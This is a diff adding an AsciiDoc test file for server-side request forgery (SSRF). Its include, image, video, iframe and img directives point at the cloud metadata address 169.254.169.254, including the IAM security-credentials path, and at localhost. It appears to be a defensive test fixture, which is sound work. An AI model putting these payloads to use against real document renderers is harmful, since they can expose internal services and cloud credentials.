@@ -1,0 +1,22 @@
+= SSRF Test AsciiDoc
+
+== External Include Test
+
+include::http://169.254.169.254/latest/meta-data/[]
+
+== Image Test
+
+image::http://169.254.169.254/latest/meta-data/hostname[]
+
+image::http://localhost:8080/test.png[SSRF Test]
+
+== Video/Audio Test
+
+video::http://169.254.169.254/latest/meta-data/[]
+
+== Iframe Include
+
+++++
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+++++
